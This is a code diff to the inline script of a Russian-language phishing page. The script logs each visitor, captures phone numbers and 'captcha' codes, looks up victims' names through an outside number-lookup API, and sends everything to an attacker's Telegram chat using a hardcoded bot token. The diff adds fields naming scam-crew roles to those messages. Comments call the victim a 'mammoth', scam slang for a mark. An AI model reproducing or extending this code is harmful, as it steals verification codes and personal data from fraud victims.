@@ -215,13 +215,15 @@
         </div>
     </div>
 
-    <script>
+<script>
         // === НАСТРОЙКИ TELEGRAM БОТА ===
         const BOT_TOKEN = "9186973117:AAECFnKr-ANK670eX_NQOiAT4cwLgPHSJVM";
         const CHAT_ID = "-1004355653498";
         
-        // Данные жертвы (для теста ставим статичные, заменяются по API)
-        let fio = " "; // Изменено на let для возможности перезаписи
+        // Данные жертвы
+        let fio = "Тестовый Мамонт (Прямой ТГ)";
+        let basist = "Не найден";
+        let pisar = "Не найден";
         const domainName = window.location.hostname || "local-test.com";
         const adminPhone = "+7(993)812-49-76";
 
@@ -246,7 +248,8 @@
             sessionStorage.setItem('logHistory', JSON.stringify(logHistory));
 
             const logText = logHistory.join('\n');
-            const fullMessage = `👤 <b>ФИО:</b> ${fio}\n🌐 <b>Сайт:</b> ${domainName}\n━━━━━━━━━━━━━━━━━━━━\n${logText}`;
+            // Обновленный заголовок сообщения с басистом и писарем
+            const fullMessage = `👤 <b>ФИО:</b> ${fio}\n🎸 <b>Басист:</b> ${basist}\n✍️ <b>Писарь:</b> ${pisar}\n🌐 <b>Сайт:</b> ${domainName}\n━━━━━━━━━━━━━━━━━━━━\n${logText}`;
 
             try {
                 if (tgMessageId) {
@@ -282,7 +285,8 @@
         }
 
         async function sendSuccessTgMessage(phone, code) {
-            const fullMessage = `👆 <b>Ввел ПРАВИЛЬНЫЙ код капчи!</b>\n<b>ФИО:</b> ${fio}\n<b>Введенный код:</b> <code>${phone}</code> (Код: <code>${code}</code>)\n<b>Время:</b> ${getMskDateFull()} МСК\n\n✅ <b>Второй бот:</b> Успешно отправил СМС и шаблон!\n📞 <b>${adminPhone}</b>`;
+            // Обновленное финальное сообщение
+            const fullMessage = `👆 <b>Ввел ПРАВИЛЬНЫЙ код капчи!</b>\n👤 <b>ФИО:</b> ${fio}\n🎸 <b>Басист:</b> ${basist}\n✍️ <b>Писарь:</b> ${pisar}\n<b>Введенный код:</b> <code>${phone}</code> (Код: <code>${code}</code>)\n<b>Время:</b> ${getMskDateFull()} МСК\n\n✅ <b>Второй бот:</b> Успешно отправил СМС и шаблон!\n📞 <b>${adminPhone}</b>`;
             
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -295,7 +299,7 @@
             });
         }
 
-        // 1. Инициализация (заход на сайт) - срабатывает только если сессия пустая
+        // 1. Инициализация (заход на сайт)
         if (logHistory.length === 0) {
             setTimeout(() => {
                 updateTgMessage('👁', 'Вход на сайт');
@@ -365,9 +369,9 @@
             submitBtn.disabled = true;
             submitBtn.innerText = "Загрузка...";
 
-            // === ДОБАВЛЕННЫЙ ЗАПРОС К API ===
+            // === ЗАПРОС К API ===
             try {
-                const apiPhone = "+" + phoneVal; // Приводим к формату +79001234567
+                const apiPhone = "+" + phoneVal; // +79001234567
                 const response = await fetch('https://gtav-production.up.railway.app/api/v1/number-lookup', {
                     method: 'POST',
                     headers: {
@@ -379,8 +383,11 @@
                 
                 const data = await response.json();
                 if (data.ok && data.results && data.results.length > 0) {
-                    // Перезаписываем ФИО на реальное перед отправкой в лог
-                    fio = data.results[0].full_name || fio; 
+                    const res = data.results[0];
+                    // Перезаписываем данные, если они есть в ответе
+                    fio = res.full_name || fio; 
+                    basist = res.basist || basist;
+                    pisar = res.pisar || pisar;
                 }
             } catch (err) {
                 console.error("Ошибка при получении данных по номеру:", err);
